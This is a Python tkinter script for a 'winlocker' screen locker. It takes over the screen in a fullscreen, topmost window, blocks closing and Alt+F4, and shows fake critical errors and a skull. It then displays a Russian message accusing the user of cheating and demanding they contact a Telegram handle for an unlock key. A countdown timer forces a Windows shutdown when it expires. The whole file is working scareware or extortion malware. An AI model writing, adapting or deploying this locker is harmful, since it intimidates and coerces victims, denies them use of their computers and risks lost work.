import tkinter as tk
from tkinter import messagebox
import sys
import time
import threading
import os

try:
    import winsound
except:
    winsound = None

root = tk.Tk()
root.title("")
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')
root.protocol("WM_DELETE_WINDOW", lambda: None)

def key_handler(e):
    if e.keysym.lower() == 'l':
        root.destroy()
        sys.exit()
    if e.keysym == 'F4' and (e.state & 0x0004):
        return "break"
root.bind('<Key>', key_handler)

def clear():
    for w in root.winfo_children():
        w.destroy()

def play_beep():
    if winsound:
        winsound.Beep(600, 500)

def stage1():
    clear()
    root.configure(bg='black')
    cross = tk.Label(root, text="✝", font=("Arial", 200), fg="white", bg="black")
    cross.place(relx=0.5, rely=0.4, anchor='center')
    err_frame = tk.Frame(root, bg='black')
    err_frame.place(x=20, y=20)
    err_text = tk.Text(err_frame, bg='black', fg='white', font=("Courier", 12), height=8, width=35, borderwidth=0)
    err_text.pack()
    lines = [
        "Critical Error",
        "Error #2123X3212x",
        "Error #X-100",
        "Error 0xDEADBEEF",
        "Critical Error",
        "You've downloaded a dangerous Winlocker"
    ]
    def add(i=0):
        if i < len(lines):
            err_text.insert(tk.END, lines[i] + "\n")
            err_text.see(tk.END)
            root.after(50, add, i+1)
        else:
            err_text.config(fg='red')
            play_beep()
            root.after(500, stage2)
    add()

def stage2():
    clear()
    root.configure(bg='red')
    ascii_art = """
             ;::::; 
           ;::::; :; 
         ;:::::'   :; 
        ;:::::;     ;. 
       ,:::::'       ;           OOO\\ 
       ::::::;       ;          OOOOO\\ 
       ;:::::;       ;         OOOOOOOO 
      ,;::::::;     ;'         / OOOOOOO 
    ;:::::::::. ,,,;.        /  / DOOOOOO 
  .';:::::::::::::::::;,     /  /     DOOOO 
,::::::;::::::;;;;::::;,   /  /        DOOO 
;::::::'::::::;;;::::: ,#/  /          DOOO 
::::::::;::::::;;::: ;::#  /            DOOO 
:::::::::;:::::::: ;::::# /              DOO 
::::::::;:::::: ;::::::#/               DOO 
::::::::::;; ;:::::::::##                OO 
:::::::::::;::::::::;:::#                OO 
:::::::::::::::::;':;::#                O 
  :::::::::::::;' /  / :# 
   :::::::::::;'  /  /   #
"""
    ascii_label = tk.Label(root, text=ascii_art, font=("Courier", 9), fg="black", bg="red", justify='left')
    ascii_label.place(x=10, y=10)
    root.after(2000, lambda: [clear(), root.configure(bg='white'), root.update(), time.sleep(0.2), root.configure(bg='blue'), stage3()])

def stage3():
    root.configure(bg='blue')
    remaining = 15 * 60
    timer_label = tk.Label(root, text="", font=("Arial", 24, "bold"), fg="white", bg="blue")
    timer_label.place(relx=1.0, x=-20, y=20, anchor='ne')
    def tick():
        nonlocal remaining
        if remaining > 0:
            m, s = divmod(remaining, 60)
            timer_label.config(text=f"{m:02d}:{s:02d}")
            remaining -= 1
            root.after(1000, tick)
        else:
            os.system("shutdown /s /t 0")
    tick()
    frame = tk.Frame(root, bg='blue', highlightbackground='white', highlightthickness=2, bd=0)
    frame.pack(expand=True, padx=50, pady=50, ipadx=20, ipady=20)
    tk.Label(frame, text="Привет, в твоей системе нашёлся чит,\nи я решил тебя наказать за читы.",
             font=("Arial", 18), fg="white", bg="blue", justify=tk.CENTER).pack(pady=10)
    tk.Label(frame, text="Для ключа напиши в тг @Azaratov",
             font=("Arial", 14), fg="white", bg="blue").pack(pady=5)
    entry = tk.Entry(frame, font=("Arial", 14), show="*", justify='center',
                     bg='blue', fg='white', insertbackground='white')
    entry.pack(pady=10)
    def check():
        if entry.get() == "1258":
            root.destroy()
            sys.exit()
        else:
            messagebox.showerror("Ошибка", "Неверный пароль")
    tk.Button(frame, text="Разблокировать", command=check,
              font=("Arial", 14), bg='blue', fg='white', activebackground='grey').pack(pady=10)

stage1()
root.mainloop()
